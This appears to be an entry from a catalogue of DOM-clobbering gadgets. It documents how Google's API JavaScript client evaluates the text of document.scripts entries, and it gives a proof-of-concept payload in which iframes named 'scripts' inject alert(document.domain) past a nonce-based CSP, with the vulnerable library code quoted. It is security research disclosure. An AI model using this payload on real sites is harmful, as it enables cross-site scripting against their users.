---
description: The Google API Client Library for JavaScript is designed for JavaScript client-application developers. It offers simple, flexible access to many Google APIs.
github: google/google-api-javascript-client
gadgets:
  ≤5BIk7BglYEE:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - iframe-tag
      - name-attr
      - src-attr
      - unsafe-eval-csp
      - before-func-call
    pocs:
      - description: The [Google API Client Library](https://github.com/google/google-api-javascript-client) was using the `document.scripts` elements' `innerText` content (if it has a `src` attribute → only `<iframe>` elements can clobber `document`, have an `innerText` and a `src`) to evaluate JavaScript code.
        code: |
          <!-- user input -->
          <iframe name="scripts" src="https://apis.google.com/js/api.js">alert(document.domain)</iframe>
          <iframe name="scripts" src="https://apis.google.com/js/api.js">alert(document.domain)</iframe>

          <script nonce="secret">
            // Load the Google API client library
            function loadGapi() {
              const script = document.createElement("script");
              script.src = "https://apis.google.com/js/api.js";
              script.nonce = "secret";
              script.onload = () => initGapi();
              document.body.appendChild(script);
            }

            // Initialize the Google API client library
            function initGapi() {
              gapi.load("client", initClient);
            }

            // Set up the API client and make a request
            function initClient() {}

            // Load the additional script
            function loadAdditionalScript() {
              const script = document.createElement("script");
              script.src = "https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.5BIk7BglYEE.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAC/rs=AHpOoo9V8V9Op_7rn4BCy9pIOBNUyU2IjA/cb=gapi.loaded_0?le=scs";
              script.nonce = "secret";
              document.body.appendChild(script);
            }

            // Initialize the loading process
            function initialize() {
              loadGapi();
              loadAdditionalScript();
            }

            initialize();
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.5BIk7BglYEE.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAC/rs=AHpOoo9V8V9Op_7rn4BCy9pIOBNUyU2IjA/cb=gapi.loaded_0?le=scs">https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.5BIk7BglYEE.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAC/rs=AHpOoo9V8V9Op_7rn4BCy9pIOBNUyU2IjA/cb=gapi.loaded_0?le=scs</a>

      ```javascript
      var e = document.scripts || document.getElementsByTagName("script") || [];
      d = [];
      var f = [];
      f.push.apply(f, zf("us"));
      for (var h = 0; h < e.length; ++h)
          for (var k = e[h], l = 0; l < f.length; ++l)
              k.src && 0 == k.src.indexOf(f[l]) && d.push(k);
      0 == d.length && 0 < e.length && e[e.length - 1].src && d.push(e[e.length - 1]);
      for (e = 0; e < d.length; ++e)
          d[e].getAttribute("gapi_processed") || (d[e].setAttribute("gapi_processed", !0),
          (f = d[e]) ? (h = f.nodeType,
          f = 3 == h || 4 == h ? f.nodeValue : f.textContent || "") : f = void 0,
          (f = Df(f)) && b.push(f));
      a && Ef(c, a);

      // [...]

      Df = function(a) {
          if (a && !/^\s+$/.test(a)) {
              for (; 0 == a.charCodeAt(a.length - 1); )
                  a = a.substring(0, a.length - 1);
              try {
                  var b = window.JSON.parse(a)
              } catch (c) {}
              if ("object" === typeof b)
                  return b;
              try {
                  b = (new Function("return (" + a + "\n)"))()
              } catch (c) {}
              if ("object" === typeof b)
                  return b;
              try {
                  b = (new Function("return ({" + a + "\n})"))()
              } catch (c) {}
              return "object" === typeof b ? b : {}
          }
      }
      ```
    links:
      - https://apis.google.com/js/api.js#latest
      - https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.5BIk7BglYEE.O/m=client/rt=j/sv=1/d=1/ed=1/am=AAAC/rs=AHpOoo9V8V9Op_7rn4BCy9pIOBNUyU2IjA/cb=gapi.loaded_0?le=scs#vulnerable
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-client-api.md
---
